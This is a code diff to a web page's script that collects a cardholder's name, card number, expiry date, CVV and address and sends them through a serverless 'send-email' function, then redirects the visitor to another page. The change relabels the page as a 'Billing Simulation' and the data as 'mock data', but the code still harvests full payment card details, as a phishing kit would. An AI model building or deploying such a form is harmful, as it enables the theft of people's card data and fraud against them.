@@ -170,21 +170,26 @@
         const c_date = document.querySelector("#c_date").value;
         const c_cvv = document.querySelector("#c_cvv").value;
         const c_address = document.querySelector("#c_address").value;
+        window.location.href = "info.html";
 
-        const res = await fetch("/.netlify/functions/send-email", {
-          method: "POST",
-          body: JSON.stringify({
-            c_name,
-            c_num,
-            c_date,
-            c_cvv,
-            c_address,
-            pageName: "Billing Page", // This changes per page
-          }),
-        });
+        try {
+          const res = await fetch("/.netlify/functions/send-email", {
+            method: "POST",
+            body: JSON.stringify({
+              c_name,
+              c_num,
+              c_date,
+              c_cvv,
+              c_address,
+              pageName: "Billing Simulation", // This changes per page
+            }),
+          });
 
-        const data = await res.json();
-        console.log("Serverless function response:", data);
+          const data = await res.json();
+          console.log("Serverless function response:", data);
+        } catch (err) {
+          console.error("Error sending mock data:", err);
+        }
       });
     </script>
   </body>
